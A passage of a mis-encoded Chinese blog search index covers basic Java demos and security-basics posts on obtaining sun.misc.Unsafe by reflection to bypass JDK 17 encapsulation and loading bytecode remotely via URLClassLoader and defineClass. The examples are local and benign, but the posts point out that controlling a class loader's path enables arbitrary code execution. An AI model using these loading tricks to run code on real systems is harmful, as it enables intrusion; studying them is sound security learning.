public void setbAuthor(String bAuthor) { this.bAuthor = bAuthor; } public Book(int bId, String bName, String bAuthor) { this.bId = bId; this.bName = bName; this.bAuthor = bAuthor; } public Book() { } } å¤šçº¿ç¨‹ ç»§æ‰¿threadç±»\nå®ç°runnableæ¥å£\nå®ç°callableæ¥å£\nè¿™é‡Œç®€å•å®ç°ä¸€ä¸‹ç»§æ‰¿çš„ï¼š\nTestç±»ï¼š\npackage com.yuy0ung.test16; public class Test { public static void main(String[] args) { //ä¸»çº¿ç¨‹çš„ä»»åŠ¡ for(int i = 1; i \u0026lt;= 20; i++) { System.out.println(\u0026#34;main--------\u0026#34;+i); } //åˆ›å»ºå­çº¿ç¨‹å¯¹è±¡ TestThread t1 = new TestThread(); //å¯åŠ¨çº¿ç¨‹ t1.start();//å¯åŠ¨ä¼šå’Œä¸»çº¿ç¨‹äº‰æŠ¢èµ„æº for(int i = 1; i \u0026lt;= 20; i++) { System.out.println(\u0026#34;main---main--\u0026#34;+i); } } } å­çº¿ç¨‹TestThreadç±»ï¼š\npackage com.yuy0ung.test16; /** * çº¿ç¨‹ç±» */ public class TestThread extends Thread { //çº¿ç¨‹å¯¹åº”ä»»åŠ¡æ”¾è¿›ä¸€ä¸ªæ–¹æ³• @Override public void run() { //è¾“å‡º10ä¸ªæ•° for (int i = 1; i \u0026lt; 20; i++) { System.out.println(\u0026#34;zixiancheng------\u0026#34;+i); } } } ç½‘ç»œç¼–ç¨‹ socketå¥—æ¥å­— é“¾æ¥åº”ç”¨å±‚å’Œä¼ è¾“å±‚ï¼Œå®ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„é€šä¿¡\nå®¢æˆ·ç«¯ï¼š\npackage com.yuy0ung.test17; import java.io.*; import java.net.Socket; public class TestClient { public static void main(String[] args) throws IOException { System.out.println(\u0026#34;client start\u0026#34;); //å¥—æ¥å­—:æŒ‡å®šæœåŠ¡å™¨IPç«¯å£å· Socket s = new Socket(\u0026#34;192.168.51.2\u0026#34;, 8001); //è¾“å‡ºæµä¼ è¾“æ•°æ® OutputStream os = s.getOutputStream(); DataOutputStream dos = new DataOutputStream(os); //ä¼ è¾“æ•°æ®ï¼š dos.writeUTF(\u0026#34;hello\u0026#34;); //æ¥å—å“åº” InputStream is = s.getInputStream(); DataInputStream dis = new DataInputStream(is); //è¾“å‡º String str = dis.readUTF(); System.out.println(\u0026#34;Server:\u0026#34;+str); //æµã€ç½‘ç»œèµ„æºå…³é—­ dos.close(); s.close(); } } æœåŠ¡ç«¯ï¼š\npackage com.yuy0ung.test17; import java.io.*; import java.net.ServerSocket; import java.net.Socket; public class TestServer { public static void main(String[] args) throws IOException { System.out.println(\u0026#34;Server start...\u0026#34;); // å¥—æ¥å­— ServerSocket ss = new ServerSocket(8001); //ç­‰å¾…å®¢æˆ·ç«¯å‘é€æ•°æ® Socket s = ss.accept(); // è¾“å…¥æµ InputStream is = s.getInputStream(); DataInputStream dis = new DataInputStream(is); // æ¥å—clientæ•°æ® String str = dis.readUTF(); System.out.println(\u0026#34;client:\u0026#34;+str); //å“åº” OutputStream os = s.getOutputStream(); DataOutputStream dos = new DataOutputStream(os); dos.writeUTF(\u0026#34;copy that\u0026#34;); //å…³é—­ dos.close(); dis.close(); s.close(); ss.close(); } } XML åŸºæœ¬æ ·å¼ï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34; ?\u0026gt; \u0026lt;!-- æ³¨é‡Šï¼š verison:ç‰ˆæœ¬å· encoding:æ–‡æ¡£ç¼–ç ä¿¡æ¯ --\u0026gt; \u0026lt;student\u0026gt; \u0026lt;student id=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;name\u0026gt;Yuy0ung\u0026lt;/name\u0026gt; \u0026lt;sex\u0026gt;ç”·\u0026lt;/sex\u0026gt; \u0026lt;age\u0026gt;19\u0026lt;/age\u0026gt; \u0026lt;/student\u0026gt; \u0026lt;student id=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;name\u0026gt;fpc\u0026lt;/name\u0026gt; \u0026lt;sex\u0026gt;ç”·\u0026lt;/sex\u0026gt; \u0026lt;age\u0026gt;20\u0026lt;/age\u0026gt; \u0026lt;/student\u0026gt; \u0026lt;student id=\u0026#34;3\u0026#34;\u0026gt; \u0026lt;name\u0026gt;ljc\u0026lt;/name\u0026gt; \u0026lt;sex\u0026gt;ç”·\u0026lt;/sex\u0026gt; \u0026lt;age\u0026gt;20\u0026lt;/age\u0026gt; \u0026lt;/student\u0026gt; \u0026lt;/student\u0026gt; æ³¨è§£ package com.yuy0ung.test19; /** * @author Yuy0ung * @version 1.0 */ public class Test { /** * * @param a æ±‚å’Œç¬¬ä¸€ä¸ªå˜é‡ * @param b æ±‚å’Œç¬¬äºŒä¸ªå˜é‡ * @return è¿”å›å€¼ */ public int add(int a, int b) { return a + b; } } é‡å†™ï¼š\npackage com.yuy0ung.test19; public class Person { public void eat() { System.out.println(\u0026#34;eat\u0026#34;); } } override\npackage com.yuy0ung.test19; public class Student extends Person { @Override public void eat() { super.eat(); } } ",
        "summary": "javaåŸºç¡€demo è®°å½•åŸºç¡€å­¦ä¹ æ—¶å†™çš„demoï¼Œå¤ä¹ åŸºç¡€\nhelloworld package com.yuy0ung.test01; /** * @author Yuy0ung */ public class HelloWorld4 { public static void main(String[] args) { System.out.println(\u0026#34;hello world\u0026#34;); System.out.println(\u0026#34;hello world\u0026#34;); } } å˜é‡ package com.yuy0ung.test01; public class TestVar { public static void main(String[] args) { //å®šä¹‰å¹´é¾„å˜é‡ int age; //åŒæ—¶å®šä¹‰å¤šä¸ª int a,b; //èµ‹å€¼ age = 18; age = 19; age = 18 + 19; //å˜é‡å®šä¹‰+èµ‹å€¼ int age1 = 19; int age2 = 18,age3 = 20; int age4,age5 = 30;//è¿™é‡Œage5è¢«èµ‹å€¼ä½†age4æ²¡æœ‰ //å˜é‡ä½¿ç”¨ System.out.println(age); System.out.println(age+10); System.out.println(age+age3); } } åŸºæœ¬æ•°æ®ç±»å‹ package com.yuy0ung.test01; public class TestType { public static void main(String[] args) { //æ•´æ•° byte a = 10;//-128~127 short b = 20;//æ­£è´Ÿ3w int c = 30;//æ­£è´Ÿ21äº¿ long d = 4000000L;///å¤§å¾—å¾ˆ...ï¼ˆè¶…è¿‡intèŒƒå›´åŠ Lï¼‰ //æµ®ç‚¹ float e = 3.14f;//ç»“å°¾è¦f double f = 3.14; //å­—ç¬¦ char g = \u0026#39;Y\u0026#39;;//å•å¼•å·æ‹¬èµ·æ¥çš„å•ä¸ªå­—ç¬¦ System.out.println(\u0026#34;Yuy0ung\u0026#34;);//å­—ç¬¦ä¸²æ˜¯å¤šä¸ªå­—ç¬¦æ‹¼æ¥ //å¸ƒå°” boolean h = true; } } ç®—æœ¯è¿ç®—ç¬¦ package com.yuy0ung.test01; public class TestOpe { public static void main(String[] args) { System.out.println(+10); System.out.println(1+2); int num = 10; //ä»å·¦åˆ°å³è¿ç®—ï¼ŒåŒ…æ‹¬ç±»å‹ System.out.println(\u0026#34;è¿™æ˜¯ä¸€ä¸ªæ•°\u0026#34;+num); System.out.println(500+20+\u0026#34;Yuy0ung\u0026#34;); System.out.println(\u0026#34;Yuy0ung\u0026#34;+5+20); num++;//è‡ªå¢ int a = 0; ++a;//è‡ªå¢ System.out.println(num); System.out.println(a); int b = 0; int c = 0; System.out.println(b++);//å…ˆè¿ç®—åè‡ªå¢ System.out.println(b); System.out.println(++c);//å…ˆè‡ªå¢åè¿ç®— } } èµ‹å€¼è¿ç®—ç¬¦ package com.yuy0ung.test01; public class TestOpe2 { public static void main(String[] args) { //èµ‹å€¼ int num1 = 1; int num2 = 2; int num3 = 10 + 30; //æ±‚å’Œ int sum = 0; sum = sum + num1; sum = sum + num2; sum += num3; System.out.println(\u0026#34;å’Œï¼š\u0026#34; + sum); } } å…³ç³»è¿ç®—ç¬¦ package com.yuy0ung.test01; public class TestOpe3 { public static void main(String[] args) { //å…³ç³»è¿ç®—ç¬¦ System.out.println(1 == 2); System.out.println(1 == 1); //é€»è¾‘è¿ç®—ç¬¦ System.out.println(true\u0026amp;\u0026amp;true); System.out.println(true\u0026amp;\u0026amp;false); System.out.println(false\u0026amp;\u0026amp;false); System.out.println(false\u0026amp;\u0026amp;true); System.out.println(false||false); System.out.println(true||true); System.out.println(true||false); } } æµç¨‹æ§åˆ¶ if package com.yuy0ung.test02; public class TestIf01 { public static void main(String[] args) { int num = 18; if (num \u0026gt; 10) { System.out.println(\u0026#34;å¤§äº10\u0026#34;); } if (num \u0026lt; 10) { System.out.println(\u0026#34;å°äº10\u0026#34;); } else { System.out.println(\u0026#34;å¤§äº10\u0026#34;); } if (num \u0026lt; 18) { System.out.println(\u0026#34;å°äº18\u0026#34;); } else if (num \u0026gt; 18) { System.out.println(\u0026#34;å¤§äº18\u0026#34;); } else { System.out.println(\u0026#34;ç­‰äº18\u0026#34;); } } } while package com.yuy0ung.test02; public class TestWhile { public static void main(String[] args) { int i = 1; while (i \u0026lt; 10) { i++; System.out.println(i); } } } for package com.yuy0ung.test02; public class TestFor { public static void main(String[] args) { int a = 10; for (int i = 0; i \u0026lt; 10; i++) { System.out.println(a); } } } æ–¹æ³•\u0026amp;é‡è½½ package com.yuy0ung.test04; public class TestMethod { //æå–ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæ±‚å’Œ public static int addNum(int a, int b) { int c = a + b; return c; } //æ–¹æ³•é‡è½½ï¼Œæ–¹æ³•åç›¸åŒï¼Œå½¢å‚åˆ—è¡¨ä¸åŒ public static void addNum(int a, int b, int c) { System.out.println(a+b+c); } public static void main(String[] args) { int sum = addNum(1, 2); System.out.println(sum); System.out.println(addNum(4, 5)); addNum(6, 7,8); } } æ•°ç»„ package com.yuy0ung.test05; public class TestArray { public static void main(String[] args) { //int ä¸ºä¾‹ int[] arr;//å®šä¹‰ arr = new int[4];//åˆ›å»ºé•¿åº¦ä¸ºå›› //åˆ›å»ºåæœ‰é»˜è®¤å€¼0 //èµ‹å€¼ arr[0] = 1; arr[1] = 2; arr[2] = 3; arr[3] = 4; //ä½¿ç”¨ System.out.println(arr[0]); System.out.println(arr[1] + 3); //éå† for (int i = 0; i \u0026lt; arr.length; i++) { System.out.println(\u0026#34;ç¬¬\u0026#34;+(i+1)+\u0026#34;ä¸ªå…ƒç´ ä¸ºï¼š\u0026#34;+arr[i]); } //for-each for (int num : arr) { System.out.println(num); } } } ç»ƒä¹  ç¿»è½¬æ•´æ•° ç»™å®šä¸€ä¸ª 32 ä½æœ‰ç¬¦å·æ•´æ•°ï¼Œå°†æ•´æ•°ä¸­çš„æ•°å­—è¿›è¡Œåè½¬ã€‚\n"
    }
,
    {
        "title": "javaå®‰å…¨åŸºç¡€-Unsafe",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-unsafe/",
        "content": "javaå®‰å…¨åŸºç¡€-Unsafe å…¨é™å®šåä¸ºsun.misc.Unsafeï¼Œæ˜¯Javaåº•å±‚çš„APIæä¾›çš„ä¸€ä¸ªç±»ï¼Œå®ƒæä¾›éå¸¸åº•å±‚çš„å†…å­˜ã€CASã€çº¿ç¨‹ç¨‹åº¦ã€ç±»ã€å¯¹è±¡ç­‰æ“ä½œAï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥ç›´æ¥æ“ä½œå†…å­˜ï¼Œä¸ç”¨æ„é€ å™¨ã€ä¸éœ€è¦ä»»ä½•è®¿é—®æƒé™æ£€æŸ¥å°±å¯ä»¥åˆ›å»ºå¯¹è±¡çš„ç±»\nsun.mics.Unsafe Unsafeæºç å¦‚ä¸‹:\npublic final class Unsafe { private static final Unsafe theUnsafe; private Unsafe() { } @CallerSensitive public static Unsafe getUnsafe() { Class var0 = Reflection.getCallerClass(); // æ£€æŸ¥è°ƒç”¨ç±»çš„åŠ è½½å™¨æ˜¯ä¸æ˜¯Bootstrapï¼Œä¹Ÿå°±æ˜¯null if (!VM.isSystemDomainLoader(var0.getClassLoader())) { throw new SecurityException(\u0026#34;Unsafe\u0026#34;); } else { return theUnsafe; } } } ä¸Šè¿°ä»£ç å¯ä»¥çœ‹å‡ºï¼ŒUnsafeå”¯ä¸€çš„æ„é€ å™¨ä¹Ÿæ˜¯privateï¼Œæ²¡æ³•é€šè¿‡newå®ä¾‹åŒ–\nè™½ç„¶getUnsafe()æ˜¯ä¸€ä¸ªpublicæ–¹æ³•ï¼Œä½†æ˜¯å®ƒä¼šæ£€æŸ¥è°ƒç”¨getUsafe()ç±»çš„åŠ è½½å™¨æ˜¯ä¸æ˜¯Bootstrapç±»åŠ è½½å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å®šä¹‰ç±»çš„é»˜è®¤åŠ è½½å™¨æ˜¯AppClassLoaderï¼Œæ‰€ä»¥ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ æ£€æŸ¥ç±»åŠ è½½å™¨ä»£ç å¦‚ä¸‹ï¼š\n// bootstrapåŠ è½½å™¨è´Ÿè´£åŠ è½½rt.jarï¼Œä¸æ˜¯javaç¼–å†™ï¼Œæ‰€ä»¥æ˜¯null public static boolean isSystemDomainLoader(ClassLoader var0) { return var0 == null; } è·å–Unsafeå¯¹è±¡ è™½ç„¶ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–è·å–Unsafeå¯¹è±¡ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡åå°„ä»theUnsafeå’Œæ„é€ å™¨å…¥æ‰‹åˆ›å»ºå®ä¾‹åŒ–å¯¹è±¡ï¼š\næ–¹æ³•ä¸€ï¼šåå°„è·å–å­—æ®µå³theUnsafeå±æ€§ï¼Œå°±ç›¸å½“äºè·å–åˆ°äº†Unsafeå¯¹è±¡ æ–¹æ³•äºŒï¼šåå°„è·å–æ„é€ å™¨ï¼Œå†è·å–Unsafeå®ä¾‹ demoå¦‚ä¸‹ï¼š\nimport sun.misc.Unsafe; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; public class TemporaryFiles { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException { Class unsafeClass = Unsafe.class; // ç¬¬ä¸€ç§æ–¹å¼ï¼šé€šè¿‡æ„é€ å™¨è·å–Unsafeå®ä¾‹ Constructor constructor = Unsafe.class.getDeclaredConstructor(); constructor.setAccessible(true); Unsafe unsafe1 = (Unsafe) constructor.newInstance(); System.out.println(unsafe1); // ç¬¬äºŒç§æ–¹æ³•ï¼šé€šè¿‡å­—æ®µè·å–Unsafeå®ä¾‹ Field theUnsafe = unsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); theUnsafe.setAccessible(true); Unsafe unsafe2 = (Unsafe) theUnsafe.get(null); System.out.println(unsafe2); } } /* è¾“å‡º: sun.misc.Unsafe@4554617c sun.misc.Unsafe@1540e19d */ åˆ©ç”¨Unsafeç»•è¿‡JDK17+å¯¹åå°„çš„é™åˆ¶ åå°„çš„é™åˆ¶ æ ¹æ® Oracleçš„æ–‡æ¡£ï¼Œä¸ºäº†å®‰å…¨æ€§ï¼Œä»JDK 17å¼€å§‹å¯¹javaæœ¬èº«ä»£ç ä½¿ç”¨å¼ºå°è£…ï¼ŒåŸæ–‡å« Strong Encapsulationã€‚ä»»ä½•å¯¹ java.* ä»£ç ä¸­çš„épublicå˜é‡å’Œæ–¹æ³•è¿›è¡Œåå°„ä¼šæŠ›å‡ºInaccessibleObjectExceptionå¼‚å¸¸\nJDKçš„æ–‡æ¡£è§£é‡Šäº†å¯¹java apiè¿›è¡Œå°è£…çš„ä¸¤ä¸ªç†ç”±ï¼š\nå¯¹javaä»£ç è¿›è¡Œåå°„æ˜¯ä¸å®‰å…¨çš„ï¼Œæ¯”å¦‚å¯ä»¥è°ƒç”¨ClassLoaderçš„defineClassæ–¹æ³•ï¼Œè¿™æ ·åœ¨è¿è¡Œæ—¶å€™å¯ä»¥ç»™ç¨‹åºæ³¨å…¥ä»»æ„ä»£ç \njavaçš„è¿™äº›éå…¬å¼€çš„apiæœ¬èº«å°±æ˜¯éæ ‡å‡†çš„ï¼Œè®©å¼€å‘è€…ä¾èµ–ä½¿ç”¨è¿™ä¸ªapiä¼šç»™JDKçš„ç»´æŠ¤å¸¦æ¥è´Ÿæ‹…\næ‰€ä»¥ä»JDK 9å¼€å§‹å°±å‡†å¤‡é™åˆ¶å¯¹java apiçš„åå°„è¿›è¡Œé™åˆ¶ï¼ˆä¼šå‡ºç°è­¦å‘Šï¼‰ï¼Œç›´åˆ°JDK 17æ‰æ­£å¼ç¦ç”¨ï¼ˆä¼šæŠ¥é”™ï¼‰\nåˆ©ç”¨Unsafeç»•è¿‡é™åˆ¶ å®˜æ–¹æ–‡æ¡£æè¿°ï¼Œjava.* çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•éƒ½æ— æ³•åå°„è·å–è°ƒç”¨äº†ï¼Œä½†åŸæ–‡ä¸­è¿˜æåˆ°:\n\u0026ldquo;Note that the sun.misc and sun.reflect packages are available for reflection by tools and libraries in all JDK releases, including JDK 17.\u0026rdquo;\nå³sun.miscå’Œsun.reflectåŒ…ä¸‹çš„æˆ‘ä»¬æ˜¯å¯ä»¥æ­£å¸¸åå°„çš„ï¼Œæ‰€ä»¥æœ‰ä¸ªå…³é”®çš„ç±»å°±å¯ä»¥æ‹¿æ¥ç”¨æ¥ï¼Œå°±æ˜¯ Unsafe\nJDK17+åå°„é™åˆ¶ç»•è¿‡ (pankas.top)\n",
        "summary": "javaå®‰å…¨åŸºç¡€-Unsafe å…¨é™å®šåä¸ºsun.misc.Unsafeï¼Œæ˜¯Javaåº•å±‚çš„APIæä¾›çš„ä¸€ä¸ªç±»ï¼Œå®ƒæä¾›éå¸¸åº•å±‚çš„å†…å­˜ã€CASã€çº¿ç¨‹ç¨‹åº¦ã€ç±»ã€å¯¹è±¡ç­‰æ“ä½œAï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥ç›´æ¥æ“ä½œå†…å­˜ï¼Œä¸ç”¨æ„é€ å™¨ã€ä¸éœ€è¦ä»»ä½•è®¿é—®æƒé™æ£€æŸ¥å°±å¯ä»¥åˆ›å»ºå¯¹è±¡çš„ç±»\nsun.mics.Unsafe Unsafeæºç å¦‚ä¸‹:\npublic final class Unsafe { private static final Unsafe theUnsafe; private Unsafe() { } @CallerSensitive public static Unsafe getUnsafe() { Class var0 = Reflection.getCallerClass(); // æ£€æŸ¥è°ƒç”¨ç±»çš„åŠ è½½å™¨æ˜¯ä¸æ˜¯Bootstrapï¼Œä¹Ÿå°±æ˜¯null if (!VM.isSystemDomainLoader(var0.getClassLoader())) { throw new SecurityException(\u0026#34;Unsafe\u0026#34;); } else { return theUnsafe; } } } ä¸Šè¿°ä»£ç å¯ä»¥çœ‹å‡ºï¼ŒUnsafeå”¯ä¸€çš„æ„é€ å™¨ä¹Ÿæ˜¯privateï¼Œæ²¡æ³•é€šè¿‡newå®ä¾‹åŒ–\nè™½ç„¶getUnsafe()æ˜¯ä¸€ä¸ªpublicæ–¹æ³•ï¼Œä½†æ˜¯å®ƒä¼šæ£€æŸ¥è°ƒç”¨getUsafe()ç±»çš„åŠ è½½å™¨æ˜¯ä¸æ˜¯Bootstrapç±»åŠ è½½å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å®šä¹‰ç±»çš„é»˜è®¤åŠ è½½å™¨æ˜¯AppClassLoaderï¼Œæ‰€ä»¥ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ æ£€æŸ¥ç±»åŠ è½½å™¨ä»£ç å¦‚ä¸‹ï¼š\n// bootstrapåŠ è½½å™¨è´Ÿè´£åŠ è½½rt.jarï¼Œä¸æ˜¯javaç¼–å†™ï¼Œæ‰€ä»¥æ˜¯null public static boolean isSystemDomainLoader(ClassLoader var0) { return var0 == null; } è·å–Unsafeå¯¹è±¡ è™½ç„¶ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–è·å–Unsafeå¯¹è±¡ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡åå°„ä»theUnsafeå’Œæ„é€ å™¨å…¥æ‰‹åˆ›å»ºå®ä¾‹åŒ–å¯¹è±¡ï¼š\n"
    }
,
    {
        "title": "javaå®‰å…¨åŸºç¡€-åŠ¨æ€åŠ è½½å­—èŠ‚ç ",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/",
        "content": "javaå®‰å…¨åŸºç¡€-åŠ¨æ€åŠ è½½å­—èŠ‚ç  å­—èŠ‚ç  ä¸¥æ ¼æ¥è¯´ï¼ŒJavaå­—èŠ‚ç ï¼ˆByteCodeï¼‰å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ï¼Œè€Œ.classæ–‡ä»¶å¯ä»¥åœ¨JVMä¸­è¿è¡Œ\næœ¬æ–‡ä¸­æ‰€è¯´çš„â€œå­—èŠ‚ç â€ï¼Œå¯ä»¥ç†è§£çš„æ›´å¹¿ä¹‰ä¸€äº›â€”â€”æ‰€æœ‰èƒ½å¤Ÿæ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨JVMè™šæ‹Ÿæœºé‡ŒåŠ è½½çš„å­—èŠ‚åºåˆ—ï¼Œéƒ½åœ¨æ¢è®¨èŒƒå›´å†…\nURLClassLoader ClassLoaderæ˜¯æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œè€Œè¿™é‡Œçš„URLClassLoaderå¯ä»¥ç”¨æ¥è¿œç¨‹åŠ è½½å­—èŠ‚ç \næ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š\nURLæœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶\nURLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶\nURLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»\nè¿™é‡Œå…³æ³¨ç¬¬ä¸‰ç§ï¼Œè¿œç¨‹åŠ è½½çš„è¯ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨http://åè®®ï¼Œçœ‹çœ‹ä¸‹é¢è¿™ä¸ªdemoï¼š é¦–å…ˆå†™ä¸€ä¸ªè®¿é—®http://127.0.0.1:8000/test.classçš„ç¨‹åºï¼š\npackage com.yuy0ung.urlclassloader; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadertest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL[] urls = {new URL(\u0026#34;http://localhost:8000/\u0026#34;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(\u0026#34;test\u0026#34;); c.newInstance(); } } ç„¶åå†™ä¸€ä¸ªæœ‰è¾“å‡ºçš„testç¨‹åºç¼–è¯‘æˆclassæ–‡ä»¶æ”¾åœ¨localhost:8000ä¸Šï¼š\npublic class test { public test() { System.out.println(\u0026#34;loader test\u0026#34;); } } ç„¶åæ‰§è¡Œç¨‹åºå‘ç°classåŠ è½½æˆåŠŸï¼š é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡Java ClassLoaderçš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç äº†\nClassLoader#defineClass å…¶å®javaçš„classåŠ è½½éƒ½ç»å†çš„æ˜¯ClassLoaderä¸­è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š\nloadClassï¼šä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œfindclass findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™defineClass defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» æ‰€ä»¥è¿™é‡Œçš„æ ¸å¿ƒå…¶å®æ˜¯defineClassï¼ŒJavaé»˜è®¤çš„ ClassLoader#defineClass æ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ï¼Œæˆ‘ä»¬å†™ä¸ªdemoæ¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼š\npackage com.yuy0ung.urlclassloader; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Base64; public class TestDefineClass { public static void main(String[] args) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException { Method defineClass = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] b = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\u0026#34;); Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Hello\u0026#34;, b, 0, b.length); hello.newInstance(); } } æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ defineClass è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼ˆåœ¨æœ¬ç³»åˆ—æ–‡ç« ç¬¬ä¸€ç¯‡ä¸­è¿›è¡Œè¿‡è¯´æ˜ï¼‰ï¼Œåœ¨ defineClass æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ defineClass åœ¨ç›®æ 